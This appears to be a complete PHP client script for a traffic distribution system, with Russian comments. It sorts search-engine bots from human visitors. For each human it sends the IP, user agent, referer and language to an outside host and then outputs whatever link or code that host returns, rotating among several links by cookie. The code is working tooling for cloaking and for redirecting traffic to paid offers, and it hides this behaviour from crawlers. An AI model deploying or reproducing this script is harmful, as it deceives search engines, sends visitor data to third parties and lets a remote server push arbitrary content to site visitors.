<?php
@ini_set('display_errors', 0);
@error_reporting(0);
$z_id = 'buddys';//ID группы
$z_api_key_host = 'rFssAi';//API ключ
$z_url = 'http://buddys.space/?api=';//ссылка на ТДС (замените только домен)
$z_em_referer = 0;//если пустой реферер - это бот (0/1)
$z_em_useragent = 1;//если пустой юзерагент - это бот (0/1)
$z_ipv6 = 1;//если IP адрес IPV6 - это бот (0/1)
$z_rd_bots = 0;//запрашивать с ТДС данные для ботов (0/1)
$z_rotator = 1;//включить ротатор и разрешить установку cookies (0/1)
$z_n_cookies = 'qwerty';//название cookies для посетителей
$z_t_cookies = 3600;//время жизни cookies в секундах
$z_connect = 1;//тип соединения, file_get_contents или curl (0/1)
$z_timeout_connect = 10;//таймаут соединения в секундах (только для curl)
$z_ip_serv_seodor = '';//если используете SEoDOR пропишите IP его серверной части
$z_status = 1;//выключить/включить слив (0/1)
/*Ниже ничего не изменяйте*/
if($z_status == 1){
	$z_out = '';
	$z_lang = '';
	$z_country = '';
	$z_city = '';
	$z_region = '';
	$z_device = '';
	$z_operator = '';
	$z_bot = '';
	$z_uniq = '';
	$z_empty = '-';
	$z_bot = $z_empty;
	$z_api_data = '';
	if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$z_useragent = $_SERVER['HTTP_USER_AGENT'];
	}
	else{
		if($z_em_useragent == 1){
			$z_bot = 'ua_empty';
		}
		$z_useragent = $z_empty;
	}
	if(!empty($_SERVER['HTTP_REFERER'])){
		$z_referer  = $_SERVER['HTTP_REFERER'];
		$z_ref = $z_referer;
		if(stristr($z_referer, 'google')){$z_se = 'google';}
		if(stristr($z_referer, 'yandex')){$z_se = 'yandex';}
		if(stristr($z_referer, 'mail.ru')){$z_se = 'mail';}
		if(stristr($z_referer, 'yahoo')){$z_se = 'yahoo';}
		if(stristr($z_referer, 'bing')){$z_se = 'bing';}
		if(empty($z_se)){$z_se = $z_empty;}
	}
	else{
		if($z_bot == $z_empty && $z_em_referer == 1){
			$z_bot = 'ref_empty';
		}
		$z_referer = $z_empty;
		$z_ref = '';
		$z_se = $z_empty;
	}
	if(stristr($z_useragent, 'baidu')){$z_bot = 'baidu';}
	if(stristr($z_useragent, 'bing') || stristr($z_useragent, 'msnbot')){$z_bot = 'bing';}
	if(stristr($z_useragent, 'google')){$z_bot = 'google';}
	if(stristr($z_useragent, 'mail.ru')){$z_bot = 'mail';}
	if(stristr($z_useragent, 'yahoo')){$z_bot = 'yahoo';}
	if(stristr($z_useragent, 'yandex')){$z_bot = 'yandex';}
	if($z_bot == $z_empty){
		$signature = 'ahrefs,aport,ask,bot,btwebclient,butterfly,commentreader,copier,crawler,crowsnest,curl,disco,ezooms,fairshare,httrack,ia_archiver,internetseer,java,js-kit,larbin,libwww,linguee,linkexchanger,lwp-trivial,netvampire,nigma,ning,nutch,offline,peerindex,postrank,rambler,semrush,slurp,soup,spider,sweb,teleport,twiceler,voyager,wget,wordpress,yeti,zeus';
		$ex = explode(",", $signature);
		$x = 0;
		while(!empty($ex[$x])){
			if(stristr($z_useragent, $ex[$x])){
				$z_bot = 'signature';
				break;
			}
			$x++;
		}
	}
	if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR']){
		if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'],".")>0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],",")>0){
			$z_ip = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
			$z_ipuser = trim($z_ip[0]);
		}
		elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'],".")>0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],",")===false){
			if(empty($z_ip_serv_seodor)){
				$z_ipuser = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
			}
		}
	}
	if(!isset($z_ipuser)){
		$z_ipuser = trim($_SERVER['REMOTE_ADDR']);
	}
	if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_ipuser = $z_empty;
	}
	if($z_bot == $z_empty && $z_ipv6 == 1 && filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_bot = 'ipv6';
	}
	if(($z_bot == $z_empty || $z_rd_bots == 1) && $z_ipuser != $z_empty){
		if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
			$z_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
		}
		if(empty($z_lang)){$z_lang = $z_empty;}
		$z_domain = $_SERVER['HTTP_HOST'];
		$z_page_url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
		if($z_rotator == 1){
			if(!isset($_COOKIE[$z_n_cookies])){
				SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
				$z_c_counter = 0;
				$z_uniq = 'yes';
			}
			else{
				$z_c_counter = $_COOKIE[$z_n_cookies] + 1;
				SetCookie($z_n_cookies, $z_c_counter, time() + $z_t_cookies, '/');
				$z_uniq = 'no';
			}
		}
		else{
			$z_uniq = 'yes';
		}
		$z_data = array(
		"api_key_host"=>$z_api_key_host,
		"id"=>$z_id,
		"ipuser"=>$z_ipuser,
		"lang"=>$z_lang,
		"referer"=>$z_referer,
		"useragent"=>$z_useragent,
		"uniq"=>$z_uniq,
		"domain"=>$z_domain,
		"se"=>$z_se,
		"key"=>@urlencode($z_key),
		"par_1"=>@urlencode($z_parameter_1),
		"par_2"=>@urlencode($z_parameter_2),
		"par_3"=>@urlencode($z_parameter_3),
		"par_4"=>@urlencode($z_parameter_4),
		"par_5"=>@urlencode($z_parameter_5)
		);
		$z_data = $z_url.base64_encode(serialize($z_data));
		if(empty($z_ip_serv_seodor) || $z_ipuser != $z_ip_serv_seodor){
			if($z_connect == 0){
				$z_api_data = @file_get_contents($z_data);
			}
			else{
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_TIMEOUT, $z_timeout_connect);
				curl_setopt($ch, CURLOPT_URL, $z_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				$z_api_data = curl_exec($ch);
				curl_close($ch);
			}
			$z_api_data_tmp = @unserialize($z_api_data);
			if(is_array($z_api_data_tmp)){
				$z_out = trim(html_entity_decode($z_api_data_tmp[0], ENT_QUOTES, 'UTF-8'));
				$z_lang = $z_api_data_tmp[1];
				$z_country = $z_api_data_tmp[2];
				$z_city = $z_api_data_tmp[3];
				$z_device = $z_api_data_tmp[4];
				$z_operator = $z_api_data_tmp[5];
				$z_bot = $z_api_data_tmp[6];
				$z_uniq = $z_api_data_tmp[7];
				$z_region = $z_api_data_tmp[8];
				if(stristr($z_out, '|||') && $z_rotator == 1){
					$z_out_ex = explode('|||', $z_out);
					if(isset($z_out_ex[$z_c_counter])){
						$z_test = trim($z_out_ex[$z_c_counter]);
					}
					if(!empty($z_test)){
						$z_out = trim($z_out_ex[$z_c_counter]);
					}
					else{
						$z_out = trim($z_out_ex[0]);
						SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
						$z_c_counter = 0;
					}
				}
				else{
					if(stristr($z_out, '|||')){
						$z_out_ex = explode('|||', $z_out);
						$z_out = trim($z_out_ex[0]);
					}
				}
			}
			else{
				$z_out = trim(html_entity_decode($z_api_data, ENT_QUOTES, 'UTF-8'));
				if(stristr($z_out, '|||') && $z_rotator == 1){
					$z_out_ex = explode('|||', $z_out);
					if(isset($z_out_ex[$z_c_counter])){
						$z_test = trim($z_out_ex[$z_c_counter]);
					}
					if(!empty($z_test)){
						$z_out = trim($z_out_ex[$z_c_counter]);
					}
					else{
						$z_out = trim($z_out_ex[0]);
						SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
						$z_c_counter = 0;
					}
				}
				else{
					if(stristr($z_out, '|||')){
						$z_out_ex = explode('|||', $z_out);
						$z_out = trim($z_out_ex[0]);
					}
				}
			}
		}
	}
	if(stristr($z_out, '[RAWURLENCODE_REFERER]')){
		$z_out = str_ireplace('[RAWURLENCODE_REFERER]', rawurlencode($z_ref), $z_out);
	}
	if(stristr($z_out, '[URLENCODE_REFERER]')){
		$z_out = str_ireplace('[URLENCODE_REFERER]', urlencode($z_ref), $z_out);
	}
	if(stristr($z_out, '[RAWURLENCODE_PAGE_URL]')){
		$z_out = str_ireplace('[RAWURLENCODE_PAGE_URL]', rawurlencode($z_page_url), $z_out);
	}
	if(stristr($z_out, '[URLENCODE_PAGE_URL]')){
		$z_out = str_ireplace('[URLENCODE_PAGE_URL]', urlencode($z_page_url), $z_out);
	}
}
/*
Если ротатор выключен, аутом будет первый URL, уникальность "по cookies" работать не будет.
Доступные переменные:
$z_out - ссылка на платник/код
$z_lang - язык браузера
$z_country - страна
$z_city - город
$z_region - код региона
$z_device - тип устройства (computer/tablet/phone)
$z_operator - оператор (beeline/megafon/mts/tele2/azerbaijan/belarus/kazakhstan/ukraine/wap-1/wap-2/wap-3/$z_empty)
$z_bot - бот (baidu/bing/google/mail/yahoo/yandex/.../$z_empty)
$z_uniq - уникальный (yes/no)
*/
?>